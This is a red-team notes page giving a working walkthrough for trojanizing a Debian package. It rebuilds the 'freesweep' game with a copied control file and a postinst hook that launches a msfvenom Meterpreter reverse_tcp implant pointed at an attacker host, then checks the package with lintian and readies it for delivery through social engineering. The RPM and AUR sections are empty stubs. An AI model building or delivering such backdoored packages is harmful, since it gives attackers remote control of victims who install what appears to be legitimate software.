---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - metasploit-framework
  - linux
---
# Trojanized Software Package

> [!TIP]
> While the target will install the backdoored software package with elevated privileges. You can include other vectors such as, elevated persistence.

## 01 - DEB

Create a temporary directory.

```
userware@hackware-os:~$ cd $(mktemp -d)
```

Download a DEB package. We will use `freesweep` as an example.

```
userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ apt download freesweep

userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ apt-get download freesweep
```

Extract the packing to a working directory then create a `DEBIAN` directory to include additional "features".

```
userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ ls
freesweep_1.0.2-1_amd64.deb

userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ dpkg -x freesweep_1.0.2-1_amd64.deb work

userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ mkdir work/DEBIAN
```

> [!IMPORTANT]
> Do not skip this step.
> > [!TIP]
> > To copy the contents in `control` file then execute either `dpkg-deb -I file.deb control` or `apt-cache show <package>` as reference.

In the `DEBIAN` directory, create a text file named `control` with the contents.

```
userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ cat > work/DEBIAN/control << EOF
Package: freesweep
Architecture: amd64
Version: 1.0.2-1
Priority: optional
Section: universe/games
Origin: Ubuntu
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Original-Maintainer: Debian Games Team <pkg-games-devel@lists.alioth.debian.org>
Description: text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer.  Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use.
EOF
```

Then create a post-installation script (`postinst`) that will trigger the implant.

```
userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ cat > work/DEBIAN/postinst << EOF
#!/bin/sh
sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &
EOF

userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ chmod 755 work/DEBIAN/postinst
```

Generate an implant for a reverse connection.

```
userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<attacker_PORT> -f elf -o work/usr/games/freesweep_scores
```

Build the `.deb` package.

```
userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ dpkg-deb -b work trojanized_freesweep.deb
dpkg-deb: building package 'freesweep' in 'trojanized_freesweep.deb'.
```

Run `lintian` to check if there any problems to the software package. We're only concerned about the post installation script (`postinst`) and the implant (`freesweep_scores`) if there was an error (`E`). For the implant's `statically-linked-binary` error message is safe to ignore. Now the implant is ready to deliver for social engineering.

```
userware@hackware-os:/tmp/tmp.N7WqUfqiWd$ lintian -c trojanized_freesweep.deb 
E: freesweep: bad-owner-for-doc-file userware/userware != root/root (or 0/0) [usr/share/doc/freesweep/README.md]
E: freesweep: bad-owner-for-doc-file userware/userware != root/root (or 0/0) [usr/share/doc/freesweep/]
E: freesweep: bad-owner-for-doc-file userware/userware != root/root (or 0/0) [usr/share/doc/freesweep/changelog.Debian.gz]
E: freesweep: bad-owner-for-doc-file ... use "--tag-display-limit 0" to see all (or pipe to a file/program)
E: freesweep: file-in-etc-not-marked-as-conffile [etc/sweeprc]
E: freesweep: mail-address-loops-or-bounces Maintainer ubuntu-devel-discuss@lists.ubuntu.com
E: freesweep: statically-linked-binary [usr/games/freesweep_scores]
E: freesweep: wrong-file-owner-uid-or-gid 1000/1000 [etc/]
E: freesweep: wrong-file-owner-uid-or-gid 1000/1000 [etc/sweeprc]
E: freesweep: wrong-file-owner-uid-or-gid 1000/1000 [usr/]
E: freesweep: wrong-file-owner-uid-or-gid ... use "--tag-display-limit 0" to see all (or pipe to a file/program)
W: freesweep: elevated-privileges 2755 userware/userware [usr/games/freesweep]
W: freesweep: maintainer-script-ignores-errors [postinst]
W: freesweep: no-manual-page [usr/games/freesweep_scores]
W: freesweep: non-standard-file-perm 0664 != 0644 [usr/games/freesweep_scores]
W: freesweep: undeclared-elf-prerequisites (libc.so.6 libncurses.so.6 libtinfo.so.6) [usr/games/freesweep]
W: freesweep: unknown-section universe/games
```

To execute the implant to retrieve a connection from the shell handler.

```
$ sudo dpkg -i trojanized_freesweep.deb

$ sudo apt install ./trojanized_freesweep.deb
```

## 02 - RPM

TODO: Fill in the steps for the RPM package.

```
$ sudo rpm -Uvh implant.rpm
```

## 03 - AUR

TODO: Fill in the steps for the AUR package.

```

```

---
## References

### Backlinks

- [[Package File Templates]]

### DMCXBlue

- [DMCXBlue: Installer Packages](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1546-event-triggered-execution/installer-packages)

### Metasploit Unleashed

- [Metasploit Unleashed: Binary Linux Trojan](https://www.offsec.com/metasploit-unleashed/binary-linux-trojan/)